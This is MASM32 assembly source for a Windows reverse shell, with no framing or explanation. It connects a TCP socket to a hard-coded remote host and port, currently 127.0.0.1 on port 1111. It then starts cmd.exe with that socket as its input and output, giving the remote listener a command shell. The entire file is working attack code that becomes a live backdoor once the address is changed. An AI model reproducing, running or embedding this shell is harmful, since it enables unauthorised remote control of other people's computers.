.686
include \masm32\include\masm32rt.inc
include \masm32\include\ws2_32.inc

includelib \masm32\lib\ws2_32.lib

; 127.0.0.1 -> 0100007fh
RHOST    equ    0100007fh
RPORT    equ    5704h

.data
cmd    BYTE "cmd",0

.data?
WSAd    WSADATA<>
sin    sockaddr_in<>
sinfo    STARTUPINFO<>
pinfo    PROCESS_INFORMATION<>

.code
start:
    mov sin.sin_family, AF_INET
    mov sin.sin_port, RPORT
    mov sin.sin_addr, RHOST
    mov sinfo.cb, sizeof STARTUPINFO
    mov sinfo.dwFlags, 100h
    invoke WSAStartup, 257, ADDR WSAd
    invoke WSASocket, AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0
    mov edi, eax
    invoke connect, edi, addr sin, sizeof sockaddr_in
    mov sinfo.hStdInput, edi
    mov sinfo.hStdOutput, edi
    mov sinfo.hStdError, edi
    invoke CreateProcess, NULL, addr cmd, NULL, NULL, TRUE, 0, NULL, NULL, addr sinfo, addr pinfo
    invoke ExitProcess, 0
end start